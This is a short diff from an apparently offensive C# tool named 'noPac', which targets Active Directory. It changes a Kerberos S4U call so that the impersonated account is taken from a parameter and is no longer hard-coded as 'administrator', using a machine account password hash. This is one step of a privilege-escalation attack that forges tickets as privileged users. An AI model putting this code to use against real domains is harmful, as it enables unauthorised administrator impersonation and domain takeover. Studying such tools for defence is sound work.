@@ -459,7 +459,7 @@ namespace noPac
 
             //s4u
             KRB_CRED kirbi = new KRB_CRED(ticket);
-            S4U.Execute(kirbi, "administrator", "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");
+            S4U.Execute(kirbi, argImpersonate, "", "", argPTT, argDomainController, argTargetSPN, null, "", "", true, false, false, machineAccountPasswordHash, Interop.KERB_ETYPE.rc4_hmac, argDomain, "");
         }
     }
 }
